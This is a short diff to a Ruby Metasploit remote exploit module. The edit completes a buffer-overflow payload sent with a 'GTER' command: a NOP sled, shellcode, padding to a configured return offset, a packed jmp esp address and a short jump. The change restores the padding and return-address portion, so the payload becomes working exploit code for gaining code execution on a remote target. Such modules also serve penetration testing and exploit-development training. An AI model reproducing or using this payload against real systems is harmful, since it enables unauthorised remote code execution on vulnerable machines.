@@ -70,7 +70,7 @@ class MetasploitModule < Msf::Exploit::Remote   # This is a remote exploit modul
     print_status("Connecting to target...")
     connect     # Connect to the target
 
-    outbound_GTER = 'GTER /.:/' + "\x90"*5 + "\x50"+ "\x5c" + shellcode #+ "\x90"*(datastore['RETOFFSET_GTER'] - 5 - 2 - shellcode.length()) + [target['jmpesp']].pack('V') + relativeshort # Create the malicious string that will be sent to the target
+    outbound_GTER = 'GTER /.:/' + "\x90"*5 + "\x50"+ "\x5c" + shellcode + "\x90"*(datastore['RETOFFSET_GTER'] - 5 - 2 - shellcode.length()) + [target['jmpesp']].pack('V') + relativeshort # Create the malicious string that will be sent to the target
 
 
     print_status("Sending Exploit")
